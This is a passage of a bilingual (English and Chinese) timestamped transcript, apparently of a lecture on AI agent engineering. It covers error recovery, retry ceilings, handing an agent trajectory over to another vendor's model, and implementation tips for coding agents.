    "en": "One notable engineering detail: some production Agents run both a production mode and a training-data collection mode—production mode may patch missing messages with placeholders, while training mode refuses to repair, because synthetic placeholders would pollute the training data.",
    "zh": "一个值得注意的工程细节：一些生产环境的智能体同时运行生产模式和训练数据收集模式——生产模式可能会用占位符修补缺失的消息，而训练模式则拒绝修复，因为合成的占位符会污染训练数据。"
  },
  {
    "id": 222,
    "start": 2004.173,
    "end": 2011.998,
    "en": "This \"lenient in production, strict in training\" dual standard reflects the deep coupling between the Harness and model training.",
    "zh": "这种‘生产环境中宽松，训练环境中严格’的双重标准反映了Harness与模型训练之间的深度耦合。"
  },
  {
    "id": 223,
    "start": 2011.998,
    "end": 2016.298,
    "en": "Recovery: escalate through increasingly visible stages.",
    "zh": "恢复：通过越来越明显的阶段逐步升级。"
  },
  {
    "id": 224,
    "start": 2016.298,
    "end": 2023.798,
    "en": "Recovery measures are graded by how visible they are to the user; if a lower level solves the problem, do not escalate:",
    "zh": "恢复措施根据其对用户的可见性分级；如果低一级措施能解决问题，就不必升级："
  },
  {
    "id": 225,
    "start": 2023.798,
    "end": 2025.836,
    "en": "Silent retry.",
    "zh": "静默重试。"
  },
  {
    "id": 226,
    "start": 2025.836,
    "end": 2029.098,
    "en": "The default action for retryable errors.",
    "zh": "可重试错误的默认操作。"
  },
  {
    "id": 227,
    "start": 2029.098,
    "end": 2059.261,
    "en": "Two details determine whether retries succeed: first, use exponential backoff with random jitter to prevent fleets of clients from retrying in lockstep and causing secondary congestion, while honoring the server's suggested wait duration; second, distinguish foreground from background calls—a failed main-loop request is retried, but auxiliary background calls (title generation, input suggestions) are dropped on failure, lest background retries crowd out the main loop's quota and create \"retry",
    "zh": "是否重试成功的两个关键点：第一，使用指数退避加随机抖动，防止大量客户端同时重试导致二次拥塞，同时遵守服务器建议的等待时间；第二，区分前台和后台调用——主循环请求失败时会重试，但辅助的后台调用（如标题生成、输入建议）在失败时会被丢弃，以免后台重试占用主循环的配额并造成“重试放大”问题。"
  },
  {
    "id": 228,
    "start": 2059.261,
    "end": 2061.123,
    "en": "amplification.",
    "zh": "放大效应。"
  },
  {
    "id": 229,
    "start": 2061.292,
    "end": 2063.404,
    "en": "Degrade and continue.",
    "zh": "降级并继续。"
  },
  {
    "id": 230,
    "start": 2063.354,
    "end": 2067.867,
    "en": "When retries fail, change the request itself and try again.",
    "zh": "当重试失败时，修改请求本身并重新尝试。"
  },
  {
    "id": 231,
    "start": 2067.867,
    "end": 2081.754,
    "en": "Take output truncation (generation cut off by the length limit): first silently resend with a raised output cap; if that is still not enough, append a meta-instruction at the end of the message so the model continues generation from the breakpoint.",
    "zh": "输出截断（因长度限制导致生成中断）：首先静默地重新发送，并提高输出上限；如果仍不够，在消息末尾添加一个元指令，使模型从断点继续生成。"
  },
  {
    "id": 232,
    "start": 2081.754,
    "end": 2097.279,
    "en": "When the primary model is persistently overloaded, fall back to another model, first stripping proprietary formatting blocks from the previous model's history so that the new model can parse it; when a high-cost mode is rate-limited, temporarily fall back to the standard mode.",
    "zh": "当主模型持续过载时，回退到另一个模型，首先去除前一个模型历史中的专有格式块，以便新模型可以解析；当高成本模式被限流时，临时回退到标准模式。"
  },
  {
    "id": 233,
    "start": 2097.279,
    "end": 2099.429,
    "en": "Surface to the user.",
    "zh": "向用户展示。"
  },
  {
    "id": 234,
    "start": 2099.429,
    "end": 2106.829,
    "en": "Only after all automatic means are exhausted is the error presented—together with the recovery actions already attempted.",
    "zh": "只有在所有自动处理手段都用尽后，才会将错误呈现给用户——同时附上已尝试的恢复操作。"
  },
  {
    "id": 235,
    "start": 2106.829,
    "end": 2113.579,
    "en": "Tool-layer errors take a different path: do not terminate the session; turn the error into the model's input.",
    "zh": "工具层错误走不同的路径：不要终止会话；将错误转化为模型的输入。"
  },
  {
    "id": 236,
    "start": 2113.579,
    "end": 2129.829,
    "en": "A hallucinated call receives a structured \"no such tool\" error result; a validation failure receives an error annotated with hints about the input contract; malformed arguments (a string emitted where an object was expected) are programmatically repaired before execution.",
    "zh": "幻觉调用会收到结构化的“没有此工具”错误结果；验证失败会收到带有输入合同提示的错误标注；格式错误（如期望对象却输出字符串）会在执行前被程序修复。"
  },
  {
    "id": 237,
    "start": 2129.829,
    "end": 2145.579,
    "en": "These errors enter the context as ordinary tool results, and the model corrects itself on the next turn—an application of the earlier principle that \"the more structured the feedback, the better\": the more specific the error fed back, the higher the model's self-correction rate.",
    "zh": "这些错误作为普通工具结果进入上下文，模型在下一轮中自行纠正——这是之前原则的应用：“反馈越结构化，效果越好”：反馈的错误越具体，模型自我修正的几率越高。"
  },
  {
    "id": 238,
    "start": 2145.579,
    "end": 2153.192,
    "en": "The core principle of this section is: the unit of error handling is not the single request, but the entire recovery loop.",
    "zh": "本节的核心原则是：错误处理的单元不是单个请求，而是整个恢复循环。"
  },
  {
    "id": 239,
    "start": 2153.192,
    "end": 2171.329,
    "en": "Until recovery is confirmed impossible, intermediate errors should not be exposed to consumers—whether the user or downstream systems subscribed to events: withhold error messages during recovery; if recovery succeeds, consumers never notice; only when everything fails are the withheld errors released.",
    "zh": "在确认无法恢复之前，不应向消费者（无论是用户还是订阅事件的下游系统）暴露中间错误：在恢复期间隐藏错误信息；如果恢复成功，消费者永远不会察觉；只有在所有尝试都失败时，才会释放这些隐藏的错误。"
  },
  {
    "id": 240,
    "start": 2171.329,
    "end": 2180.204,
    "en": "This is the engineering realization of Chapter 1's correction principle—\"do not expose intermediate states until recovery is confirmed impossible.",
    "zh": "这是第1章修正原则的工程实现——“在确认无法恢复之前，不要暴露中间状态。”"
  },
  {
    "id": 241,
    "start": 2180.204,
    "end": 2184.717,
    "en": "Handover: passing an unfinished trajectory to another model.",
    "zh": "交接：将未完成的轨迹传递给另一个模型。"
  },
  {
    "id": 242,
    "start": 2184.717,
    "end": 2190.217,
    "en": "When the primary model stays unavailable, another vendor has to finish the trajectory.",
    "zh": "当主模型不可用时，另一个供应商必须完成该轨迹。"
  },
  {
    "id": 243,
    "start": 2190.217,
    "end": 2197.154,
    "en": "The real obstacle is not that the endpoint differs, but that part of the trajectory belongs to the original vendor alone.",
    "zh": "真正的障碍不在于终点不同，而在于轨迹的一部分仅属于原供应商。"
  },
  {
    "id": 244,
    "start": 2197.154,
    "end": 2206.767,
    "en": "Tool calls and tool results are structured differently across vendors yet carry the same meaning, so re-rendering them is enough; the model's reasoning is the hard part.",
    "zh": "工具调用和工具结果在不同供应商之间结构不同，但含义相同，因此只需重新渲染即可；模型的推理才是难点。"
  },
  {
    "id": 245,
    "start": 2206.767,
    "end": 2215.592,
    "en": "Reasoning usually consists of two things: readable text, and a credential the vendor attaches to it to prove the reasoning really came from itself.",
    "zh": "推理通常包括两部分：可读文本，以及供应商附加的凭证以证明推理确实来自自身。"
  },
  {
    "id": 246,
    "start": 2215.592,
    "end": 2224.417,
    "en": "The text is still legible to another model, the credential is worthless there—a cross-vendor handover can carry the text, but not the credential.",
    "zh": "文本对另一个模型仍然可读，但凭证在那里毫无价值——跨供应商的交接可以传递文本，但无法传递凭证。"
  },
  {
    "id": 247,
    "start": 2224.417,
    "end": 2228.254,
    "en": "Vendors do not agree on what they require of a credential.",
    "zh": "供应商对凭证的要求并不一致。"
  },
  {
    "id": 248,
    "start": 2228.254,
    "end": 2234.029,
    "en": "The permissive end validates nothing; the strict end rejects any credential it did not issue.",
    "zh": "宽松端不会验证任何内容；严格端会拒绝所有它未颁发的凭证。"
  },
  {
    "id": 249,
    "start": 2234.029,
    "end": 2240.492,
    "en": "Nor is the credential necessarily attached to the reasoning—it may be attached to the tool call instead.",
    "zh": "凭证不一定附着于推理本身——它可能附着于工具调用上。"
  },
  {
    "id": 250,
    "start": 2240.492,
    "end": 2248.179,
    "en": "So the seemingly safe policy \"just delete all the reasoning and you are fine\" is precisely what fails at some vendors.",
    "zh": "因此，看似安全的策略“删除所有推理即可”恰恰会在某些供应商处失败。"
  },
  {
    "id": 251,
    "start": 2248.179,
    "end": 2262.304,
    "en": "A handover has to be designed for the strictest end, with a fallback for the cases it cannot satisfy: rewrite the historical tool calls as prose, which stops the model from treating them as tools it actually invoked, but at least lets it carry on.",
    "zh": "交接必须针对最严格的端设计，并为无法满足的情况提供回退方案：将历史工具调用重写为文字，这会阻止模型将其视为实际调用的工具，但至少能让它继续运行。"
  },
  {
    "id": 252,
    "start": 2262.46,
    "end": 2270.547,
    "en": "This yields a design principle: a trajectory should not be stored in any single vendor's wire format, but kept in a neutral one.",
    "zh": "这得出一个设计原则：轨迹不应存储在任何单一供应商的格式中，而应保持在中立格式中。"
  },
  {
    "id": 253,
    "start": 2270.497,
    "end": 2282.585,
    "en": "Each reasoning segment is split into portable text and a non-portable credential; a tool call records only its name and arguments, and identifiers are regenerated for the target vendor when the request is rendered.",
    "zh": "每个推理段分为可移植的文本和不可移植的凭证；工具调用仅记录名称和参数，当请求被渲染时，标识符会在目标供应商处重新生成。"
  },
  {
    "id": 254,
    "start": 2282.585,
    "end": 2292.385,
    "en": "On a switch the credential is always discarded and the text is carried across as ordinary content, rather than being pushed back into wherever the target vendor keeps reasoning.",
    "zh": "在切换时，凭证总是被丢弃，文本作为普通内容传递，而不是被重新放入目标供应商保存推理的地方。"
  },
  {
    "id": 255,
    "start": 2292.385,
    "end": 2302.122,
    "en": "The reasoning summary a vendor returns is exactly the portable copy meant for this situation—keep it, and there is no need to call a model again to compress anything.",
    "zh": "供应商返回的推理摘要正是为此情况准备的可移植副本——保留它，就无需再次调用模型来压缩任何内容。"
  },
  {
    "id": 256,
    "start": 2302.122,
    "end": 2315.672,
    "en": "The value of a neutral trajectory is not limited to failover either: the evaluation replays of Chapter 7, the training-sample construction of Chapter 8 and the experience extraction of Chapter 9 all rely on the same artifact.",
    "zh": "中立轨迹的价值不仅限于故障转移：第7章的评估重放、第8章的训练样本构建和第9章的经验提取都依赖于相同的产物。"
  },
  {
    "id": 257,
    "start": 2315.672,
    "end": 2322.197,
    "en": "Experiment 5-1 advanced difficulty, three stars: : Cross-Vendor Trajectory Handover",
    "zh": "实验5-1 高难度，三颗星：跨厂商轨迹交接"
  },
  {
    "id": 258,
    "start": 2322.197,
    "end": 2335.485,
    "en": "Experiment Goal: Verify whether a neutral trajectory format lets a half-finished Agent trajectory be finished by a different vendor's model, and quantify what \"verbatim pass-through\" and \"strip everything\" each cost.",
    "zh": "实验目标：验证中立轨迹格式是否能让一个未完成的智能体轨迹由不同厂商的模型完成，并量化“逐字传递”和“删除一切”各自的成本。"
  },
  {
    "id": 259,
    "start": 2335.485,
    "end": 2349.247,
    "en": "Technical Approach: Use a task that needs several rounds of tool calls; midway, inject consecutive rate-limit and overload responses for the current vendor, and after the circuit breaker trips, switch to another vendor and continue.",
    "zh": "技术方法：使用需要多轮工具调用的任务；中途注入连续的速率限制和过载响应，当电路断路器触发后，切换到另一个厂商并继续执行。"
  },
  {
    "id": 260,
    "start": 2349.247,
    "end": 2358.785,
    "en": "Store the trajectory in a neutral format where reasoning is split into portable text and a non-portable credential and a tool call records only its name and arguments.",
    "zh": "将轨迹存储在中立格式中，其中推理被拆分为可移植文本、不可移植凭据，以及仅记录名称和参数的工具调用。"
  },
  {
    "id": 261,
    "start": 2358.785,
    "end": 2382.135,
    "en": "Compare three treatments: pass-through moves the original vendor's messages verbatim into the new vendor's structure; stripping deletes all reasoning and credentials; neutral discards the credential and carries the text, or the reasoning summary the vendor returned, as ordinary content, regenerating identifiers for the target vendor and rewriting historical calls as prose when the receiving side insists on a credential.",
    "zh": "比较三种处理方式：传递方式将原始厂商的消息逐字移动到新厂商的结构中；删除方式删除所有推理和凭据；中立方式则丢弃凭据，将文本或厂商返回的推理摘要作为普通内容携带，在接收方坚持需要凭据时，为目标厂商重新生成标识符并将历史调用重写为叙述性文本。"
  },
  {
    "id": 262,
    "start": 2382.135,
    "end": 2387.247,
    "en": "Pick three vendors whose wire formats differ and switch between each pair.",
    "zh": "选择三个协议格式不同的厂商，并在每对之间进行切换。"
  },
  {
    "id": 263,
    "start": 2387.247,
    "end": 2397.472,
    "en": "Acceptance Criteria: Retain the raw response of the first request after every switch; a pass-through failure must be the vendor's real error, never a simulated one.",
    "zh": "验收标准：每次切换后保留第一个请求的原始响应；传递失败必须是厂商的真实错误，而非模拟的错误。"
  },
  {
    "id": 264,
    "start": 2397.472,
    "end": 2406.66,
    "en": "Require the neutral treatment to produce no API error on any vendor pair, and record faithfully which pairs the other two fail on and with what error.",
    "zh": "要求中立处理在任何厂商对上都不产生API错误，并准确记录其他两种方式在哪对厂商上失败以及失败原因。"
  },
  {
    "id": 265,
    "start": 2406.66,
    "end": 2418.86,
    "en": "Compare the three on task completion, on how often the same tool is called again after the switch (fingerprinted by tool name plus arguments), and on the extra rounds and tokens needed to finish after the switch.",
    "zh": "比较三者在任务完成度、切换后再次调用相同工具的频率（通过工具名称加参数进行指纹识别），以及切换后完成任务所需的额外轮次和标记数。"
  },
  {
    "id": 266,
    "start": 2418.86,
    "end": 2424.872,
    "en": "If the neutral treatment does not beat stripping on redundant calls, record that just as faithfully.",
    "zh": "如果中立处理在冗余调用上不优于删除方式，也要如实地记录这一点。"
  },
  {
    "id": 267,
    "start": 2424.872,
    "end": 2432.435,
    "en": "Experiment 5-2 intermediate difficulty, two stars: : Continuing After the Output Is Cut Off Halfway",
    "zh": "实验5-2 中等难度，两颗星：输出中途被截断后的继续执行"
  },
  {
    "id": 268,
    "start": 2432.435,
    "end": 2442.635,
    "en": "Experiment Goal: Compare \"resend the whole turn\" against \"continue from the half-written output as a prefix\" in cost, correctness and side effects.",
    "zh": "实验目标：比较“重新发送整个回合”与“从半写输出作为前缀继续”在成本、正确性和副作用方面的差异。"
  },
  {
    "id": 269,
    "start": 2442.635,
    "end": 2451.36,
    "en": "Technical Approach: Cut the connection at three points in a streaming response—mid-reasoning, mid-prose, and mid tool-call argument.",
    "zh": "技术方法：在流式响应的三个点切断连接——推理中途、叙述中途和工具调用参数中途。"
  },
  {
    "id": 270,
    "start": 2451.36,
    "end": 2472.86,
    "en": "Three recovery routes: discard the fragment and resend the whole turn; append the fragment as a trailing assistant message and ask the model to continue it (some vendors support this natively, some require the message to be explicitly marked as one awaiting continuation, and those without such an interface fall back to the next route); append a meta-instruction saying to continue from the break.",
    "zh": "三种恢复路径：丢弃片段并重新发送整个回合；将片段作为尾随助理消息附加，并让模型继续（某些厂商原生支持此功能，某些需要显式标记消息为待继续，而没有此类接口的厂商则退回到下一种路径）；附加一条元指令，指示从断点继续。"
  },
  {
    "id": 271,
    "start": 2472.86,
    "end": 2482.772,
    "en": "A half-written tool call cannot be sent back in its native structure, so it must be turned into text for the model to complete, then re-parsed and validated after splicing.",
    "zh": "一个未完成的工具调用不能以原生结构返回，因此必须转换为文本让模型完成，然后在拼接后重新解析和验证。"
  },
  {
    "id": 272,
    "start": 2482.772,
    "end": 2491.347,
    "en": "If a tool was already executed eagerly from the fragment, deduplicate by call fingerprint before continuing to avoid repeating the side effect.",
    "zh": "如果一个工具已经从片段中被提前执行了，在继续之前请通过调用指纹去重，以避免重复产生副作用。"
  },
  {
    "id": 273,
    "start": 2491.516,
    "end": 2514.691,
    "en": "Acceptance Criteria: Repeat each of the three break points several times and report, for each route, the recovery rate, the output tokens saved relative to a full resend, the validity and the semantic correctness of the completed arguments (a splice easily adds stray whitespace or duplicated characters, and valid is not the same as correct), and the number of repeated side effects.",
    "zh": "验收标准：多次重复每个三个断点并报告，对于每条路径，恢复率、相对于完整重新发送节省的输出标记数、完成参数的有效性以及语义正确性（拼接容易添加多余的空格或重复字符，有效不等于正确），以及重复副作用的数量。"
  },
  {
    "id": 274,
    "start": 2514.641,
    "end": 2521.328,
    "en": "Also record which break points cannot be reproduced at which vendors, and whether the fallback route works.",
    "zh": "同时记录哪些断点在哪些供应商处无法重现，以及回退路径是否有效。"
  },
  {
    "id": 275,
    "start": 2521.328,
    "end": 2525.178,
    "en": "Termination: every recovery path needs a ceiling.",
    "zh": "终止：每条恢复路径都需要有一个上限。"
  },
  {
    "id": 276,
    "start": 2525.178,
    "end": 2543.878,
    "en": "Recovery mechanisms themselves can fail, so every recovery path must have an explicit retry ceiling: context compaction gives up after several consecutive failures; the permission classifier falls back to asking a human after repeated failures; output continuation is attempted at most a fixed number of times.",
    "zh": "恢复机制本身也可能失败，因此每条恢复路径都必须有明确的重试上限：上下文压缩在连续几次失败后放弃；权限分类器在重复失败后回退到向人类求助；输出延续最多尝试固定次数。"
  },
  {
    "id": 277,
    "start": 2543.878,
    "end": 2546.328,
    "en": "Where do the thresholds come from?",
    "zh": "阈值来自哪里？"
  },
  {
    "id": 278,
    "start": 2546.328,
    "end": 2549.166,
    "en": "Production data, not guesswork.",
    "zh": "来自生产数据，而非猜测。"
  },
  {
    "id": 279,
    "start": 2549.166,
    "end": 2572.516,
    "en": "Take Claude Code's compaction circuit breaker: the \"3 consecutive failures\" threshold comes from real session statistics—one session once failed over three thousand times in a row on this very recovery path, and such futile retries alone wasted about 250,000 API calls per day worldwide; more than a thousand sessions saw streaks of 50+ consecutive failures.",
    "zh": "以Claude Code的压缩断路器为例：\"3次连续失败\"的阈值来自真实会话统计数据——有一次会话在这个恢复路径上连续失败了3000次，仅这些无意义的重试每天就浪费了约25万次API调用；超过一千个会话出现了连续失败50次以上的记录。"
  },
  {
    "id": 280,
    "start": 2572.516,
    "end": 2581.791,
    "en": "Three is the empirical inflection point between \"the vast majority of failures recover before this\" and \"further retries are essentially hopeless.",
    "zh": "3是一个经验性的转折点，介于\"大多数失败在此前可以恢复\"和\"进一步重试基本上毫无希望\"之间。"
  },
  {
    "id": 281,
    "start": 2581.791,
    "end": 2591.428,
    "en": "More insidious than a single-point breaker is the death spiral: logic triggered on the error path itself calls the LLM, fails again, and cascades.",
    "zh": "比单点断路器更危险的是死亡螺旋：错误路径上的逻辑本身调用了LLM，再次失败，并导致级联。"
  },
  {
    "id": 282,
    "start": 2591.428,
    "end": 2609.566,
    "en": "One real cascade: the Agent stops on a context-overflow error, which fires a stop hook (cleanup logic that runs automatically when the Agent ends) that \"commits code on exit,\" the hook calls the LLM to write a commit message, context overflows again, and the hook fires once more.",
    "zh": "一个真实的级联案例：Agent在上下文溢出错误时停止，这触发了一个停止钩子（Agent结束时自动运行的清理逻辑），该钩子会\"退出时提交代码\"，钩子调用LLM来编写提交信息，再次出现上下文溢出，钩子再次触发。"
  },
  {
    "id": 283,
    "start": 2609.566,
    "end": 2624.266,
    "en": "Defense comes in two parts: disable all model-invoking side effects on the error path (better to lose an auxiliary feature once, such as automatic memory extraction), and use a recursion-depth counter to detect and break any residual cascade.",
    "zh": "防御措施分为两部分：在错误路径上禁用所有调用模型的副作用（宁愿暂时失去一个辅助功能，例如自动内存提取），并使用递归深度计数器检测并打破任何残留的级联。"
  },
  {
    "id": 284,
    "start": 2624.266,
    "end": 2638.366,
    "en": "Finally, above all automatic mechanisms sit global termination and escalation conditions: a maximum number of turns, a session budget cap, and escalation to human intervention when consecutive failures exceed their threshold.",
    "zh": "最后，所有自动机制之上都有全局终止和升级条件：最大回合数、会话预算上限，当连续失败超过阈值时升级到人工干预。"
  },
  {
    "id": 285,
    "start": 2638.366,
    "end": 2641.553,
    "en": "Implementation Tips for Coding Agents.",
    "zh": "代码智能体的实现技巧。"
  },
  {
    "id": 286,
    "start": 2641.553,
    "end": 2644.803,
    "en": "The workflow described above is the ideal.",
    "zh": "上面描述的工作流程是理想状态。"
  },
  {
    "id": 287,
    "start": 2644.803,
    "end": 2655.141,
    "en": "Making it run in practice takes a handful of concrete implementation techniques—ways to raise response speed and cut context consumption without degrading the quality of thought.",
    "zh": "在实际中运行需要一些具体的实现技术——这些技术可以提高响应速度并减少上下文消耗，同时不降低思考质量。"
  },
  {
    "id": 288,
    "start": 2655.141,
    "end": 2661.103,
    "en": "They are the general Agent techniques of Chapters 2 and 4, applied to the programming domain.",
    "zh": "它们是第2章和第4章中介绍的通用智能体技术，应用于编程领域。"
  },
  {
    "id": 289,
    "start": 2661.103,
    "end": 2666.153,
    "en": "Parallel Tool Calls, Streaming Execution, and Cascading Abort.",
    "zh": "并行工具调用、流式执行和级联中止。"
  },
  {
    "id": 290,
    "start": 2666.153,
    "end": 2674.916,
    "en": "Traditional Agent implementations often work serially: generate a tool call, execute it, get the result, then decide the next step.",
    "zh": "传统智能体实现通常是串行的：生成一个工具调用，执行它，获取结果，然后决定下一步。"
  },
  {
    "id": 291,
    "start": 2674.916,
    "end": 2678.441,
    "en": "This strict queuing wastes a great deal of time.",
    "zh": "这种严格的排队方式浪费了大量时间。"
  },
  {
    "id": 292,
    "start": 2678.596,
    "end": 2696.896,
    "en": "Modern Coding Agents should fully leverage streaming responses: Chapter 2 introduced this mechanism when discussing model output order—once the parameters of the first tool call are fully generated and pass validation, execution can begin immediately, without waiting for the model to generate subsequent tool calls.",
    "zh": "现代代码智能体应充分利用流式响应：第2章在讨论模型输出顺序时介绍了这一机制——一旦第一个工具调用的参数完全生成并通过验证，就可以立即开始执行，而无需等待模型生成后续的工具调用。"
  },
  {
    "id": 293,
    "start": 2696.846,
    "end": 2713.408,
    "en": "For example, if the model needs to output three tool calls in one inference—search code, check configuration files, and read logs—the first call can start executing as soon as its parameters are complete and validated, overlapping with the generation of the other two.",
    "zh": "例如，如果模型在一个推理中需要输出三个工具调用——搜索代码、检查配置文件和读取日志——那么第一个调用可以在其参数完成并验证后立即开始执行，与其他两个调用的生成重叠。"
  },
  {
    "id": 294,
    "start": 2713.408,
    "end": 2718.208,
    "en": "Independent calls can also be executed in parallel rather than queued.",
    "zh": "独立调用也可以并行执行，而不是排队。"
  },
  {
    "id": 295,
    "start": 2718.208,
    "end": 2725.421,
    "en": "This overlapping execution significantly reduces end-to-end latency, making the Agent's responses more agile.",
    "zh": "这种重叠执行显著减少了端到端延迟，使智能体的响应更加敏捷。"
  },
  {
    "id": 296,
    "start": 2725.421,
    "end": 2729.333,
    "en": "The flip side of parallel execution is fault handling.",
    "zh": "并行执行的另一面是故障处理。"
  },
  {
    "id": 297,
    "start": 2729.333,
    "end": 2736.233,
    "en": "Each tool definition should declare whether it supports concurrent execution (default is no, fail-safe).",
    "zh": "每个工具定义应声明是否支持并发执行（默认为否，安全优先）。"
  },
  {
    "id": 298,
    "start": 2736.233,
    "end": 2753.108,
    "en": "When a call fails, a cascading abort mechanism terminates other calls started in the same batch that depend on its result, but does not affect independent calls or the parent operation—this is a concrete implementation of the \"fault boundary control\" principle from the Harness engineering section.",
    "zh": "当一个调用失败时，级联中止机制会终止同一批次中依赖其结果的其他调用，但不会影响独立调用或父操作——这是Harness工程部分提到的“故障边界控制”原则的具体实现。"
  },
  {
    "id": 299,
    "start": 2753.108,
    "end": 2755.958,
    "en": "Fine-Grained Context Management.",
    "zh": "细粒度上下文管理。"
  },
  {
    "id": 300,
    "start": 2755.958,
    "end": 2763.471,
    "en": "The fundamental challenge for Coding Agents is that codebases are usually large, but the model's context window is limited.",
    "zh": "代码智能体的根本挑战在于代码库通常很大，但模型的上下文窗口是有限的。"
  },
  {
    "id": 301,
    "start": 2763.471,
    "end": 2772.308,
    "en": "Even if advanced models claim to support millions of tokens, stuffing the entire codebase into the context is neither economical nor necessary.",
    "zh": "即使先进的模型声称支持数百万个标记，将整个代码库放入上下文中既不经济也不必要。"
  },
  {
    "id": 302,
    "start": 2772.308,
    "end": 2776.996,
    "en": "Intelligent context management needs to operate at multiple levels.",
    "zh": "智能的上下文管理需要在多个层次上运行。"
  },
  {
    "id": 303,
    "start": 2776.996,
    "end": 2782.171,
    "en": "At the file reading level, the Agent should not always read the entire file.",
    "zh": "在文件读取层面，智能体不应总是读取整个文件。"
  },
  {
    "id": 304,
    "start": 2782.171,
    "end": 2793.758,
    "en": "For large files, the tool should support reading specific line ranges—for example, only reading lines 100 to 150, rather than loading a file with thousands of lines.",
    "zh": "对于大文件，工具应支持读取特定行范围——例如，只读取第100到150行，而不是加载包含数千行的文件。"
  },
  {
    "id": 305,
    "start": 2793.758,
    "end": 2801.858,
    "en": "More importantly, when returning content, line numbers should be attached—each line of code is prefixed with its actual line number.",
    "zh": "更重要的是，返回内容时应附上行号——每一行代码前都应带有其实际行号。"
  },
  {
    "id": 306,
    "start": 2801.858,
    "end": 2815.183,
    "en": "This seemingly simple design brings great value: the model can precisely reference \"line 42 of src/main.py,\" reducing ambiguity and making subsequent edit operations more reliable.",
    "zh": "这一看似简单的设计具有巨大价值：模型可以精确引用“src/main.py的第42行”，减少歧义，并使后续的编辑操作更加可靠。"
  },
  {
    "id": 307,
    "start": 2815.183,
    "end": 2820.696,
    "en": "At the command execution level, handling terminal output also requires care.",
    "zh": "在命令执行层面，处理终端输出也需要谨慎。"
  },
  {
    "id": 308,
    "start": 2820.696,
    "end": 2825.033,
    "en": "Compilation or testing can produce thousands of lines of output.",
    "zh": "编译或测试可能会产生数千行输出。"
  },
  {
    "id": 309,
    "start": 2825.033,
    "end": 2830.246,
    "en": "If all of it is injected into the context, the budget is quickly exhausted.",
    "zh": "如果全部注入到上下文中，预算会迅速耗尽。"
  },
  {
    "id": 310,
    "start": 2830.246,
    "end": 2851.746,
    "en": "The long output truncation and persistence mechanism introduced in Chapter 4 is widely applied here: retain the first few lines of output (usually containing error context) and the last few lines (usually containing error summaries), replace the middle with a one-line placeholder, and note that the complete output has been saved to a temporary file for on-demand viewing.",
    "zh": "第4章介绍的长输出截断和持久化机制在此被广泛使用：保留输出的前几行（通常包含错误上下文）和最后几行（通常包含错误摘要），中间用一行占位符代替，并注明完整输出已保存到临时文件中，供按需查看。"
  },
  {
    "id": 311,
    "start": 2851.746,
    "end": 2855.071,
    "en": "Dynamic Injection of Environment Information.",
    "zh": "环境信息的动态注入。"
  },
  {
    "id": 312,
    "start": 2855.071,
    "end": 2861.408,
    "en": "This is a practical application of the Agent status bar technique from Chapter 2 to Coding Agents.",
    "zh": "这是第2章中智能体状态栏技术在代码智能体中的实际应用。"
  },
  {
    "id": 313,
    "start": 2861.408,
    "end": 2867.633,
    "en": "Unlike general Agents, Coding Agents are highly dependent on the state of the execution environment.",
    "zh": "与通用智能体不同，代码智能体高度依赖于执行环境的状态。"
  },
  {
    "id": 314,
    "start": 2867.633,
    "end": 2875.971,
    "en": "Before each inference, the following key environment information should be injected at the end of the context in the form of an Agent status bar:",
    "zh": "在每次推理之前，应以智能体状态栏的形式，在上下文末尾注入以下关键环境信息："
  },
  {
    "id": 315,
    "start": 2875.971,
    "end": 2880.496,
    "en": "Current working directory: ensures path references are correct",
    "zh": "当前工作目录：确保路径引用正确"
  },
  {
    "id": 316,
    "start": 2880.496,
    "end": 2885.433,
    "en": "Git branch: knows whether working on the main branch or a feature branch",
    "zh": "Git分支：知道当前是在主分支还是功能分支上工作"
  },
  {
    "id": 317,
    "start": 2885.433,
    "end": 2889.658,
    "en": "Recent commit history: understands the project's evolution",
    "zh": "最近的提交历史：了解项目的演进过程"
  },
  {
    "id": 318,
    "start": 2889.658,
    "end": 2895.521,
    "en": "Overview of unstaged and staged changes: knows what modifications have been made",
    "zh": "未暂存和已暂存更改的概览：知道已经做了哪些修改"
  },
  {
    "id": 319,
    "start": 2895.521,
    "end": 2907.046,
    "en": "This information should not be hardcoded into static system prompts—that would destroy KV Cache efficiency—but should be dynamically generated and injected as an appended Agent status bar.",
    "zh": "这些信息不应该硬编码到静态系统提示中——这会破坏KV缓存效率——而应该动态生成并作为附加的智能体状态栏注入。"
  },
  {
    "id": 320,
    "start": 2907.046,
    "end": 2917.033,
    "en": "In this way, the Agent gains \"environmental awareness,\" with each decision based on an accurate understanding of the current state, rather than outdated assumptions.",
    "zh": "通过这种方式，智能体获得了\"环境意识\"，每个决策都基于对当前状态的准确理解，而不是过时的假设。"
  },
  {
    "id": 321,
    "start": 2917.033,
    "end": 2920.896,
    "en": "State Persistence in the Command Execution Environment.",
    "zh": "命令执行环境中的状态持久化。"
  },
  {
    "id": 322,
    "start": 2921.044,
    "end": 2933.019,
    "en": "When interacting with code, many operations depend on environment state: changing directories, activating virtual environments, setting environment variables, starting background services.",
    "zh": "在与代码交互时，许多操作依赖于环境状态：切换目录、激活虚拟环境、设置环境变量、启动后台服务。"
  },
  {
    "id": 323,
    "start": 2932.969,
    "end": 2947.056,
    "en": "If each command is executed in a fresh shell, all this state is lost—the Agent just used cd to navigate to the project directory, but the next command starts again in the shell's default directory, forcing it to repeat the same setup.",
    "zh": "如果每个命令都在一个全新的外壳中执行，所有这些状态都会丢失——智能体刚刚用cd导航到项目目录，但下一个命令又从外壳的默认目录开始，迫使它重复相同的设置。"
  },
  {
    "id": 324,
    "start": 2947.056,
    "end": 2957.444,
    "en": "Worse, the effects of some operations (like activating a Python virtual environment) are only valid within the current shell session and cannot be passed across sessions.",
    "zh": "更糟糕的是，某些操作（如激活Python虚拟环境）的效果只在当前外壳会话中有效，无法跨会话传递。"
  },
  {
    "id": 325,
    "start": 2957.444,
    "end": 2965.769,
    "en": "Therefore, a persistent terminal session should be maintained, created when the Agent starts and kept active throughout the entire interaction.",
    "zh": "因此，应维护一个持久的终端会话，在智能体启动时创建，并在整个交互过程中保持活动状态。"
  },
  {
    "id": 326,
    "start": 2965.769,
    "end": 2973.656,
    "en": "Each command is executed in this shared terminal, preserving the working directory, environment variables, and session state.",
    "zh": "每个命令都在这个共享终端中执行，保留工作目录、环境变量和会话状态。"
  },
  {
    "id": 327,
    "start": 2973.656,
    "end": 2980.794,
    "en": "This design is more aligned with the work habits of human developers—we usually work in a long-running terminal window.",
    "zh": "这种设计更符合人类开发者的日常工作习惯——我们通常在一个长时间运行的终端窗口中工作。"
  },
  {
    "id": 328,
    "start": 2980.794,
    "end": 2990.381,
